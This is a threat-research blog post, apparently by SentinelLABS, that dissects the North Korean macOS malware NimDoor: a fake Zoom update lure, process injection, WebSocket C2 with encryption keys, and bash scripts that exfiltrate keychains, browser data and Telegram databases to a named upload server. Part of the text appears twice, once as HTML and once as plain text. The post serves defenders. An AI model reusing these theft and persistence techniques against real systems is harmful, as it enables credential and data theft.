data.</li>\n<li aria-level=\"1\">SentinelLABS&#8217; analysis highlights novel TTPs and malware artifacts that tie together previously reported components, extending our understanding of the threat actors&#8217; evolving playbook.</li>\n</ul>\n<p>In April 2025, <a href=\"https://huntability.tech/threat-note-2025-04-23-nk-zoom/\" target=\"_blank\" rel=\"noopener noreferrer\">Huntabil.IT</a> observed a targeted attack on a Web3 startup, attributing the incident to a DPRK threat actor group. Several reports on social media at the time described similar incidents at other Web3 and Crypto organizations. Analysis revealed an attack chain consisting of an eclectic mix of scripts and binaries written in AppleScript, C++ and Nim. Although the early stages of the attack follow a familiar DPRK pattern using social engineering, lure scripts and fake updates, the use of Nim-compiled binaries on macOS is a more unusual choice. A report by <a href=\"https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis\" target=\"_blank\" rel=\"noopener noreferrer\">Huntress</a> in mid-June described a similar initial attack chain as observed by Huntabil.IT, albeit using different later stage payloads.</p>\n<p>SentinelLABS&#8217; analysis of the payloads used in the April incidents shows the Nim stages contain some unique features including encrypted configuration handling, asynchronous execution built around Nim&#8217;s native runtime, and a signal-based persistence mechanism previously unseen in macOS malware.</p>\n<p>In this post, we provide an overview of the attack chain and a technical analysis of the C++ and Nim-based components. We refer to this family of malware collectively as NimDoor, based on its functionality and development traits. Indicators of compromise and insights into the malware&#8217;s architecture are provided to aid defenders and threat hunters in identifying related activity.</p>\n<h2>Initial Access and Payload Delivery</h2>\n<p>The attack chain begins with a now-familiar social engineering vector: impersonation of a trusted contact over Telegram and inviting the target to schedule a meeting via Calendly. The target is subsequently sent an email containing a Zoom meeting link and instructions to run a so-called &#8220;Zoom SDK update script&#8221;.</p>\n<p>An attacker-controlled domain hosts an AppleScript file named <code>zoom_sdk_support.scpt</code>. Variants of this script can be found in public malware repositories through the seemingly unintentional typo in a code comment: <code>- - Zook SDK Update</code> instead of <code>- - Zoom SDK Update</code>. The file is heavily padded, containing 10,000 lines of whitespace to obfuscate its true function.</p>\n<figure id=\"attachment_124992\" aria-describedby=\"caption-attachment-124992\" style=\"width: 1918px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14.jpg\" alt=\"The zoom_sdk_support.scpt is padded with 10k lines of whitespace; note the typo ‘Zook’ and the scroll bar, top right\" width=\"1918\" height=\"1148\" class=\"size-full wp-image-124992\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14.jpg 1918w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-300x180.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-1024x613.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-768x460.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-1536x919.jpg 1536w\" sizes=\"auto, (max-width: 1918px) 100vw, 1918px\" /><figcaption id=\"caption-attachment-124992\" class=\"wp-caption-text\">The <em>zoom_sdk_support.scpt</em> is padded with 10k lines of whitespace; note the typo ‘Zook’ and the scroll bar, top right</figcaption></figure>\n<p>The script ends with three lines of malicious code that retrieve and execute a second-stage script from a command-and-control server hosted at <code>support.us05web-zoom[.]forum</code>.

The posts by Huntabil.IT and Huntress mentioned earlier describe much the same initial attack chain. However, the second part of the attack chain is where things begin to get both different and increasingly complex.</p>\n<h2>Execution Chain and File Deployment</h2>\n<p>The multi-staged infection process Huntabil.IT observed resulted in the download of two Mach-O binaries—<code>a</code> and <code>installer</code>—into <code>/private/var/tmp</code>. These two binaries set off two independent execution chains.</p>\n<p>In the first, the <code>a</code> binary is a C++-compiled universal architecture Mach-O executable. It writes an encrypted embedded payload called <code>netchk</code> to disk. The execution from here involves a complex chain of obfuscation and distraction which we describe in the following section. Ultimately, the aim is to fetch two Bash scripts used for data exfiltration. These include mechanisms for scraping general system data as well as application-specific data like browser data and Telegram chat histories. All operations are staged from a folder created at <code>~/Library/DnsService</code>.</p>\n<p>The second execution chain starts with the <code>installer</code> binary, which is also a universal Mach-O executable compiled from Nim source code, and is responsible for persistence setup. It drops two additional Nim-compiled binaries: <code>GoogIe LLC</code> (where &#8220;GoogIe&#8221; is spelled using a deceptive capital &#8220;i&#8221; rather than a lowercase &#8216;L&#8217;) and <code>CoreKitAgent</code>. These payloads orchestrate long-term access and recovery mechanisms for the threat actor.</p>\n<h2>Technical Analysis of a, netchk and trojan1_arm64</h2>\n<p>Both Huntabil.IT and Huntress describe use of a C++-compiled binary with the name <code>a</code> being deposited as a result of initial infection through the fake Zoom update scripts described earlier.</p>\n<p>The <code>a</code> binary is <i>ad hoc</i> signed and carries the identifier <code>InjectWithDyldArm64</code>. As reported by previous researchers, it can take a command line argument <code>--d</code>, which results in the deletion of <code>a</code>&#8216;s current working directory, or a file name and password. In the Huntabil.IT post, this was reported as:</p>\n<pre>\r\n./a ./netchk gift123$%^\r\n</pre>\n<p>The <code>InjectWithDyldArm64</code> (<i>aka</i> <code>a</code>) binary uses Password-Based Key Derivation Function 2 (<a href=\"https://en.wikipedia.org/wiki/PBKDF2\" target=\"_blank\" rel=\"noopener noreferrer\">PBKDF2</a>) with HMAC-SHA-256 to derive a 32-byte key from the password <code>gift123$%^</code>, using 10000 iterations and a salt consisting of the first sixteen characters of the embedded base64 string.</p>\n<p>The derived key and the base64 decoded encrypted data are passed to the <code>AesEncrypt</code> function, which iterates through 16 byte blocks of the encrypted data. On each iteration it:</p>\n<ul>\n<li aria-level=\"1\">calls <code>AesTrans</code>, a wrapper for <a href=\"https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html\" target=\"_blank\" rel=\"noopener noreferrer\">CCCrypt</a>, to perform an AES encryption in CBC mode with the derived key and a zero-filled initialization vector. In the first iteration the data to be encrypted is the key itself, but in subsequent iterations the input data is taken from the previous <code>AesTrans</code> call.</li>\n<li aria-level=\"1\">XORs the current encrypted data block with the current <code>AesTrans</code> result.</li>\n</ul>\n<figure id=\"attachment_124995\" aria-describedby=\"caption-attachment-124995\" style=\"width: 1494px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11.jpg\" alt=\"The AesTrans function is a wrapper of CCCrypt\" width=\"1494\" height=\"628\" class=\"size-full wp-image-124995\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11.jpg 1494w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11-300x126.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11-1024x430.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11-768x323.jpg 768w\" sizes=\"auto, (max-width: 1494px) 100vw, 1494px\" /><figcaption id=\"caption-attachment-124995\" class=\"wp-caption-text\">The <em>AesTrans</em> function is a wrapper of <em>CCCrypt</em></figcaption></figure>\n<p>SentinelLABS&#8217; analysis shows that this process is used to decrypt two embedded binaries. The first carries an <i>ad hoc</i> signature and the identifier <code>Target</code>. The second has an <i>ad hoc</i> signature with the identifier <code>trojan1_arm64</code>. The <code>Target</code> binary is benign and appears to do nothing other than generate random numbers.</p>\n<p>However, <code>Target</code> is spawned by <code>InjectWithDyldArm64</code> in a suspended state via</p>\n<pre>\r\nposix_spawnattr_init(&amp;attrp) &amp;&amp; !posix_spawnattr_setflags(&amp;attrp, POSIX_SPAWN_START_SUSPENDED)\r\nposix_spawn(&amp;pid, filename, 0, &amp;attrp, argv_1, environ)\r\n</pre>\n<p>and injected with the <code>trojan1_arm64</code> binary&#8217;s code. After injection, the suspended <code>Target</code> process is resumed via</p>\n<pre>\r\nkill(pid, SIGCONT)\r\n</pre>\n<p>and the code from the <code>trojan1_arm64</code> binary is executed.</p>\n<p>This kind of process injection technique is rare in macOS malware and requires specific entitlements to be performed; in this case, the <code>InjectWithDyldArm64</code> binary has the following entitlements to allow the injection:</p>\n<pre>\r\ncom.apple.security.cs.debugger\r\ncom.apple.security.get-task-allow\r\n</pre>\n<p>After first negotiating an HTTP handshake, the injected code uses <code>wss</code> to communicate with the C2 &#8211; another uncommon technique for macOS malware &#8211; at <code>wss://firstfromsep[.]online/client</code>.</p>\n<p>The malware uses multiple levels of RC4 encryption in combination with the base64 encoding and three different keys before the communication.</p>\n<p>Our analysis found that the communication messages from the C2 use a JSON format of <code>{\"name\":\"\",\"payload\":\"\",\"target\":\"\"}</code>. The name field takes the value <code>auth</code> or <code>message</code>.</p>\n<p>When the <code>auth</code> value is used, the <code>payload</code> field has the JSON structure <code>{\"uid\":\"\",\"cipher\":\"\"}</code>, where the <code>uid</code> field contains a generated uid value and the <code>cipher</code> field contains the uid value encrypted using the key <code>Ej7bx@YRG2uUhya#50Yt*ao</code> and then encoded in base64. We suspect the <code>target</code> field is used for the victim identifier.</p>\n<p>When the <code>message</code> value is used, the <code>payload</code> field value is encrypted using the key <code>3LZu5H$yF^FSwPu3SqbL*sK</code>. The payload has the JSON structure <code>{\"cmd\":, \"data\":\"\"}</code> where the <code>cmd</code> field contains an <b>int</b> value for the command to be executed.

It exists in both an unsigned stripped (~233KB) version and an <i>ad hoc</i> signed, unstripped (~340KB) version. VirusTotal telemetry indicates that the stripped version was uploaded from South Korea in October 2024. The unstripped version was observed in the wild in early April 2025. Although it is a universal binary, the <i>ad hoc</i> signature identifies the binary as <code>user_startup_main_arm64</code>.</p>\n<p>The <code>CoreKitAgent</code> program operates as an event-driven application using macOS&#8217;s <a href=\"https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/kqueue.2.html\" target=\"_blank\" rel=\"noopener noreferrer\">kqueue</a> mechanism. The <code>_main</code> function sets up Nim&#8217;s standard signal handlers and then hands control to an asynchronous continuation function <code>_mainX20X28AsyncX29___user95startup95main_u45</code>, which initiates the malware&#8217;s core logic.</p>\n<p>Control flow within this function is handled by a 10-case switch statement implemented as a <a href=\"https://levelup.gitconnected.com/implementing-finite-state-machines-using-transition-tables-f2990a6f3bc5\" target=\"_blank\" rel=\"noopener noreferrer\">table-driven state machine</a>, with an execution state stored in memory and updated via a lookup table with the following values:</p>\n<pre>\r\n00 00 fe ff 03 00 00 00 fe ff fe ff fe ff fe ff\r\n</pre>\n<figure id=\"attachment_125002\" aria-describedby=\"caption-attachment-125002\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4.jpg\" alt=\"The lookup table is hard-coded in the __const section\" width=\"1999\" height=\"950\" class=\"size-full wp-image-125002\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-300x143.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-1024x487.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-768x365.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_4-1536x730.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><figcaption id=\"caption-attachment-125002\" class=\"wp-caption-text\">The lookup table is hard-coded in the <em>__const</em> section</figcaption></figure>\n<p>After each case completes, the code consults the lookup table to determine the next state depending on error conditions or specific flags set during execution of the previous case. For example, if certain error bits are set, the next state value might be negated, effectively creating alternate paths through the state sequence depending on runtime conditions.</p>\n<p>From an analysis point of view, much of the interesting malicious behaviour occurs in Case 1, which overrides some of the earlier signal handlers for intercepting SIGINT and SIGTERM. SIGINT is sent to a process when a user attempts to kill a process (such as by pressing <b>ctl-c</b> in the Terminal). SIGTERM, in contrast, is a signal sent by the system or another process, such as when the <code>kill</code> command is invoked by a user in the Terminal or by a program or script.</p>\n<figure id=\"attachment_124988\" aria-describedby=\"caption-attachment-124988\" style=\"width: 1434px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18.jpg\" alt=\"Signal handlers 0x2 (SIGINT) and 0xf (SIGTERM) are set up to catch termination\" width=\"1434\" height=\"350\" class=\"size-full wp-image-124988\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18.jpg 1434w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-300x73.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-1024x250.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-768x187.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_18-818x199.jpg 818w\" sizes=\"auto, (max-width: 1434px) 100vw, 1434px\" /><figcaption id=\"caption-attachment-124988\" class=\"wp-caption-text\">Signal handlers 0x2 (SIGINT) and 0xf (SIGTERM) are set up to catch termination</figcaption></figure>\n<p>When triggered, <code>CoreKitAgent</code> catches these signals and writes the LaunchAgent for persistence, a copy of <code>GoogIe LLC</code> as the loader, and a copy of itself as the trojan, setting executable permissions on the latter two via the <code>addExecutionPermissions_user95startup95mainZutils_u32</code> function.</p>\n<figure id=\"attachment_124999\" aria-describedby=\"caption-attachment-124999\" style=\"width: 1548px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7.jpg\" alt=\"Persistence logic writes and sets execution permissions on the agent, trojan and loader binaries\" width=\"1548\" height=\"1540\" class=\"size-full wp-image-124999\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7.jpg 1548w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-300x298.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-1024x1019.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-150x150.jpg 150w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-768x764.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-1536x1528.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-50x50.jpg 50w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_7-24x24.jpg 24w\" sizes=\"auto, (max-width: 1548px) 100vw, 1548px\" /><figcaption id=\"caption-attachment-124999\" class=\"wp-caption-text\">Persistence logic writes and sets execution permissions on the agent, trojan and loader binaries</figcaption></figure>\n<p>This behavior ensures that any user-initiated termination of the malware results in the deployment of the core components, making the code resilient to basic defensive actions.</p>\n<p>The state machine also contains a 10-minute sleep routine, likely as an anti-VM or sandbox countermeasure. The sleep routine is set up and called in Case 6 with a hard-coded value of <b>0x927c0</b> (600,000ms), as indicated in the following pseudocode.</p>\n<pre>\r\nvoid* rax_29 = _sleepAsync__user95startup95main_u73(0x927c0);  // 600,000ms = 10min\r\nif (*r12 != 0)\r\n\t_eqdestroy___pureZasyncdispatch_u1229(rax_29);  // Error cleanup\r\nelse {\r\n\t_eqsink___pureZasyncdispatch_u7188(rsi_1 + 0x40, rax_29);  // Store future\r\n\tif (*r12 == 0) {\r\n\t\t*(r15 + 8) = 7;  // Transition to state 7\r\n\t\trsi_15 = *(r15 + 0x40);\r\n\t}\r\n}\r\n</pre>\n<p>The sleep function, <code>_sleepAsync__user95startup95main_u73</code>, uses the operating system&#8217;s <a href=\"https://developer.apple.com/documentation/driverkit/3438076-mach_absolute_time\" target=\"_blank\" rel=\"noopener noreferrer\">mach_absolute_time()</a> and <a href=\"https://developer.apple.com/documentation/driverkit/3433733-mach_timebase_info\" target=\"_blank\" rel=\"noopener noreferrer\">mach_timebase_info()</a> to create an asynchronous sleep. Rather than just blocking execution for 10 minutes &#8211; a technique many sandboxes would detect and counter &#8211; it instead registers a wake-up time with a global dispatcher and continues execution of the main event loop. When the sleep timer expires, <code>CoreKitAgent</code> calls Case 7 and continues execution.</p>\n<h2>AppleScript Beacon and Backdoor</h2>\n<p>The malware&#8217;s custom encryption and obfuscation routines involve multiple passes through several functions. One of these involves deobfuscating string literals made up of long sequences of hexadecimal numbers that are passed to a decrypt function, <code>_fromHex__pkgZnimcryptoZutils_u257</code>.</p>\n<p>In the unstripped version, one of the hexadecimal strings contains the template for the previously discussed LaunchAgent.

The script also executes any response received from the C2 via the <code>run script</code> command, meaning this simple AppleScript functions both as a beacon and a backdoor.</p>\n<p>The embedded AppleScript in the stripped version of <code>CoreKitAgent</code> takes a different form and uses different embedded C2 server addresses but has similar functionality, including the 30 second delay interval.</p>\n<figure id=\"attachment_125001\" aria-describedby=\"caption-attachment-125001\" style=\"width: 1906px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5.jpg\" alt=\"The embedded .ses script in the stripped CoreKitAgent binary after decoding\" width=\"1906\" height=\"1674\" class=\"size-full wp-image-125001\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5.jpg 1906w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-300x263.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-1024x899.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-768x675.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_5-1536x1349.jpg 1536w\" sizes=\"auto, (max-width: 1906px) 100vw, 1906px\" /><figcaption id=\"caption-attachment-125001\" class=\"wp-caption-text\">The embedded <em>.ses</em> script in the stripped <em>CoreKitAgent</em> binary after decoding</figcaption></figure>\n<h2>Conclusion</h2>\n<p>SentinelLABS&#8217; analysis of NimDoor shows how threat actors are continuing to explore cross-platform languages that introduce new levels of complexity for analysts.</p>\n<p>North Korean-aligned threat actors have <a href=\"https://www.sentinelone.com/blog/dprk-crypto-theft-macos-rustbucket-droppers-pivot-to-deliver-kandykorn-payloads/\" target=\"_blank\" rel=\"noopener noreferrer\">previously experimented</a> with Go and Rust, similarly combining scripts and compiled binaries into multi-stage attack chains.

Leveraging AppleScript to perform duties like beaconing is a novel approach that removes the need for a traditional post-exploitation framework and the detection &#8216;noise&#8217; such implants can create. In addition, the use of <code>wss</code> for communications and signal interrupts to trigger persistence logic provide yet further evidence of active development in new ways to defeat security measures.</p>\n<p>Earlier this year, we saw threat actors utilizing <a href=\"https://www.sentinelone.com/blog/readerupdate-reforged-melting-pot-of-macos-malware-adds-go-to-crystal-nim-and-rust-variants/\" target=\"_blank\" rel=\"noopener noreferrer\">Nim as well as Crystal</a>, and we expect the choice of less familiar languages to become an increasing trend among macOS malware authors due both to their technical advantages and their unfamiliarity to analysts. As ever in the cat-and-mouse game of threat and threat detection, when one side innovates, the other must respond, and we encourage other analysts, researchers, and detection engineers to invest effort in understanding these lesser-known languages and how they will eventually be leveraged.</p>\n<h2>Indicators of Compromise</h2>\n<p><b>Domains</b></p>\n<div style=\"overflow-x:auto;\">\n<table style=\"border-collapse: collapse;

Several reports on social media at the time described similar incidents at other Web3 and Crypto organizations. Analysis revealed an attack chain consisting of an eclectic mix of scripts and binaries written in AppleScript, C++ and Nim. Although the early stages of the attack follow a familiar DPRK pattern using social engineering, lure scripts and fake updates, the use of Nim-compiled binaries on macOS is a more unusual choice. A report by Huntress in mid-June described a similar initial attack chain as observed by Huntabil.IT, albeit using different later stage payloads.\nSentinelLABS’ analysis of the payloads used in the April incidents shows the Nim stages contain some unique features including encrypted configuration handling, asynchronous execution built around Nim’s native runtime, and a signal-based persistence mechanism previously unseen in macOS malware.\nIn this post, we provide an overview of the attack chain and a technical analysis of the C++ and Nim-based components. We refer to this family of malware collectively as NimDoor, based on its functionality and development traits. Indicators of compromise and insights into the malware’s architecture are provided to aid defenders and threat hunters in identifying related activity.\nInitial Access and Payload Delivery\nThe attack chain begins with a now-familiar social engineering vector: impersonation of a trusted contact over Telegram and inviting the target to schedule a meeting via Calendly. The target is subsequently sent an email containing a Zoom meeting link and instructions to run a so-called “Zoom SDK update script”.\nAn attacker-controlled domain hosts an AppleScript file named zoom_sdk_support.scpt. Variants of this script can be found in public malware repositories through the seemingly unintentional typo in a code comment: - - Zook SDK Update instead of - - Zoom SDK Update. The file is heavily padded, containing 10,000 lines of whitespace to obfuscate its true function.\nThe zoom_sdk_support.scpt is padded with 10k lines of whitespace; note the typo ‘Zook’ and the scroll bar, top right\nThe script ends with three lines of malicious code that retrieve and execute a second-stage script from a command-and-control server hosted at support.us05web-zoom[.]forum. This domain name format has been chosen for similarity to the legitimate Zoom meeting domain us05web.zoom[.]us.\nOur analysis found a number of parallel domains in use by the same actor.\n\r\nsupport.us05web-zoom[.]pro\r\nsupport.us05web-zoom[.]forum\r\nsupport.us05web-zoom[.]cloud\r\nsupport.us06web-zoom[.]online\r\n\nOther examples found in public repositories suggest a wider campaign, possibly with unique URLs for each target\nThe follow-on script downloads an HTML file named check, which includes a legitimate Zoom redirect link.\n\r\n<a ref=\"https://us05web.zoom[.]us/j/4724012536?pwd=ADlAXdxkUclRhvYoJbpKQmizkQ1RV4.1\">Temporary Redirect</a>\r\n\nThis HTML file is passed to curl and executed via run script, ultimately launching the attack’s core logic.\nResearchers at Validin have also recently published extended indicators around this and associated infrastructure. The posts by Huntabil.IT and Huntress mentioned earlier describe much the same initial attack chain. However, the second part of the attack chain is where things begin to get both different and increasingly complex.\nExecution Chain and File Deployment\nThe multi-staged infection process Huntabil.IT observed resulted in the download of two Mach-O binaries—a and installer—into /private/var/tmp. These two binaries set off two independent execution chains.\nIn the first, the a binary is a C++-compiled universal architecture Mach-O executable. It writes an encrypted embedded payload called netchk to disk. The execution from here involves a complex chain of obfuscation and distraction which we describe in the following section. Ultimately, the aim is to fetch two Bash scripts used for data exfiltration. These include mechanisms for scraping general system data as well as application-specific data like browser data and Telegram chat histories. All operations are staged from a folder created at ~/Library/DnsService.\nThe second execution chain starts with the installer binary, which is also a universal Mach-O executable compiled from Nim source code, and is responsible for persistence setup. It drops two additional Nim-compiled binaries: GoogIe LLC (where “GoogIe” is spelled using a deceptive capital “i” rather than a lowercase ‘L’) and CoreKitAgent. These payloads orchestrate long-term access and recovery mechanisms for the threat actor.\nTechnical Analysis of a, netchk and trojan1_arm64\nBoth Huntabil.IT and Huntress describe use of a C++-compiled binary with the name a being deposited as a result of initial infection through the fake Zoom update scripts described earlier.\nThe a binary is ad hoc signed and carries the identifier InjectWithDyldArm64. As reported by previous researchers, it can take a command line argument --d, which results in the deletion of a‘s current working directory, or a file name and password. In the Huntabil.IT post, this was reported as:\n\r\n./a ./netchk gift123$%^\r\n\nThe InjectWithDyldArm64 (aka a) binary uses Password-Based Key Derivation Function 2 (PBKDF2) with HMAC-SHA-256 to derive a 32-byte key from the password gift123$%^, using 10000 iterations and a salt consisting of the first sixteen characters of the embedded base64 string.\nThe derived key and the base64 decoded encrypted data are passed to the AesEncrypt function, which iterates through 16 byte blocks of the encrypted data. On each iteration it:\ncalls AesTrans, a wrapper for CCCrypt, to perform an AES encryption in CBC mode with the derived key and a zero-filled initialization vector. In the first iteration the data to be encrypted is the key itself, but in subsequent iterations the input data is taken from the previous AesTrans call.\nXORs the current encrypted data block with the current AesTrans result.\nThe AesTrans function is a wrapper of CCCrypt\nSentinelLABS’ analysis shows that this process is used to decrypt two embedded binaries. The first carries an ad hoc signature and the identifier Target. The second has an ad hoc signature with the identifier trojan1_arm64. The Target binary is benign and appears to do nothing other than generate random numbers.\nHowever, Target is spawned by InjectWithDyldArm64 in a suspended state via\n\r\nposix_spawnattr_init(&attrp) && !posix_spawnattr_setflags(&attrp, POSIX_SPAWN_START_SUSPENDED)\r\nposix_spawn(&pid, filename, 0, &attrp, argv_1, environ)\r\n\nand injected with the trojan1_arm64 binary’s code. After injection, the suspended Target process is resumed via\n\r\nkill(pid, SIGCONT)\r\n\nand the code from the trojan1_arm64 binary is executed.\nThis kind of process injection technique is rare in macOS malware and requires specific entitlements to be performed; in this case, the InjectWithDyldArm64 binary has the following entitlements to allow the injection:\n\r\ncom.apple.security.cs.debugger\r\ncom.apple.security.get-task-allow\r\n\nAfter first negotiating an HTTP handshake, the injected code uses wss to communicate with the C2 – another uncommon technique for macOS malware – at wss://firstfromsep[.]online/client.\nThe malware uses multiple levels of RC4 encryption in combination with the base64 encoding and three different keys before the communication.\nOur analysis found that the communication messages from the C2 use a JSON format of {\"name\":\"\",\"payload\":\"\",\"target\":\"\"}. The name field takes the value auth or message.\nWhen the auth value is used, the payload field has the JSON structure {\"uid\":\"\",\"cipher\":\"\"}, where the uid field contains a generated uid value and the cipher field contains the uid value encrypted using the key Ej7bx@YRG2uUhya#50Yt*ao and then encoded in base64. We suspect the target field is used for the victim identifier.\nWhen the message value is used, the payload field value is encrypted using the key 3LZu5H$yF^FSwPu3SqbL*sK. The payload has the JSON structure {\"cmd\":, \"data\":\"\"} where the cmd field contains an int value for the command to be executed. Available commands we were able to identify in trojan1_arm64 were as follows:\nCommand\nCode\nFunction\n\n\nexecCmd \n12 \nExecute the arbitrary command provided in the data field.\n\n\nsetCwd \n34 \nChange the Current Working Directory to the one given in the data field.\n\n\ngetCwd \n78 \nGet the Current Working Directory.\n\n\ngetSysInfo \n234 \nGet information about the system such as boot time, username, macOS version, machine name, platform and arch.\n\n\n\n\n\n\n\nBinary Ninja’s Medium Level Interpreted Language (MLIL) representation of the command processing code\nThe result of an executed command is returned to the C2 in the payload field, now having the form {\"cmd\":,\"err\":,\"data\":\"\"}, where cmd contains the int value related to the command that was executed, err contains an int value related to success or failure, and data contains the results of the executed command. For example, when a getSysInfo command is executed, the data field will be populated with values in a JSON structure of the form {\"boottime\":,\"username\":\"\",\"version\":\"\",\"comname\":\"\",\"platform\":\"\",\"arch\":\"\"}.\nThe whole JSON message is encrypted using the key lZjJ7iuK2qcmMW6hacZOw62.\nData Stealing Bash Scripts\nThe first part of the attack chain concludes with trojan1_arm64 downloading and executing two scripts, upl and tlgrm.\nThe upl script is a credential-stealer designed to silently extract browser and system-level information, package it, and exfiltrate it. The script targets data from the following browsers:\nArc\nBrave\nFirefox\nGoogle Chrome\nMicrosoft Edge\nTargeted browsers in the upl script\nBrowser data is copied to\n\r\n/private/var/tmp/uplex_<username>/<browser>/\r\n\nThe script also targets the following Keychain and shell files and directories:\n\r\n/Library/Keychains/System.keychain\r\n~/Library/Keychains/login.keychain-db\r\n~/.bash_history\r\n~/.zsh_history\r\n~/.zsh/\r\n\nThe data is then compressed via ditto -ck and posted to the C2 using curl.\nThe tlgrm script steals Telegram’s encrypted local database (postbox/db) and the decryption key blob, .tempkeyEncrypted, presumably for offline decryption or brute force attempts.\nThe tlgrm script targets the .tempkeyEncrypted file required for decryption\nThe Telegram data is exfiltrated to the same server used in the upl script. The uploadData() function in both scripts is identical save for one variable name used to specify the server address: hostName in upl and serverUrl in tlgrm.\n\r\nupl:\r\nhostName=\"https[:]//dataupload[.]store/uploadfiles\"\r\n\r\ntlgrm:\r\nserverUrl=\"https[:]//dataupload[.]store/uploadfiles\"\r\n\nComparison of upl and tlgrm; the scripts use an almost identical function to exfiltrate user data\nOur investigation found related scripts in public malware repositories that may be tied to similar attacks. We list these in the Indicators of Compromise section at the end of this post.\nTechnical Analysis of installer, GoogIe LLC, and CoreKitAgent\nInstaller\nThe second part of the attack chain begins with the installer binary dropped alongside a by the initial access scripts. Compiled from Nim and weighing in at ~233KB, the installer binary is a universal architecture Mach-O with an ad hoc signature and the identifier user_startup_installer_arm64.\nThe installer binary checks for the existence of a LaunchAgent at [~]/Library/LaunchAgents/com.google.update.plist and creates folder paths at [~]/Library/CoreKit/ and  [~]/Library/Application Support/GoogIe LLC/ for use by the later stages described in the following sections.\nThe installer binary prepares the file paths for later stages\nThe misspelling of GoogIe LLC (uppercase ‘i’, not lowercase ‘L’) is intended to help the malware blend in and avoid suspicion.\nAn interesting feature of this and the other compiled Nim binaries is the existence of code that at first blush could be mistaken for C2 command options.\nBoilerplate Nim code can look deceptively malicious\nHuntress researchers also reported observing a subset of these “po” commands in their analysis. Nim documentation reveals that these are part of Nim’s std/osproc module, used for executing OS processes, similar to the way Objective-C uses NSTask, and are not attacker-written code or malware artifacts.\nWe identified two versions of the installer binary, identical except for the path used to set up the config file used by later stage payloads. One version of installer uses /private/tmp/cfg (06566eabf54caafe36ebe94430d392b9cf3426ba) while the other uses /private/tmp/.config (08af4c21cd0a165695c756b6fda37016197b01e7).\nTwo versions of the installer binary are identical save for the embedded config file path\nIn both cases, installer checks that the file does not exist, then writes a 0 byte file to the path, setting write-only access (O_WRONLY) on the file. The file path contents are populated by the next stage GoogIe LLC and later read by CoreKitAgent.\nGoogIe LLC\nCompiled from Nim and approximately 195KB, the GoogIe LLC executable is a universal Mach-O bearing an ad hoc code signature with the identifier user_startup_loader_arm64. Interestingly, only the filename for this stage uses the typo spoofing trick; the parent folder /Google LLC/ spells Google correctly with a lowercase “L”.\n\r\n~/Library/Application Support/Google LLC/GoogIe LLC\r\n\nThe binary’s primary function is to set up a configuration file and launch the next stage, CoreKitAgent. The GoogIe LLC executable contains hardcoded data that is combined with local environmental data, encoded, and then written out to the config file in /private/tmp.\nHardcoded data encrypted and written out to a hidden file /private/tmp/.config\nThe resulting config file contains a 298 byte string of hexadecimal characters. This is later read by CoreKitAgent, which is responsible for writing the LaunchAgent to disk using com.google.update.plist for the Label key and the GoogIe LLC binary for the program argument. The data written to the config file is used as the value for the LaunchAgent’s CLIENT_AUTH_KEY key.\nThe LaunchAgent contains customized Client and Server keys for communication with the C2\nThe first 47 characters of the value of CLIENT_AUTH_KEY are also identical to the first 47 characters (of the total 86) used for the value of 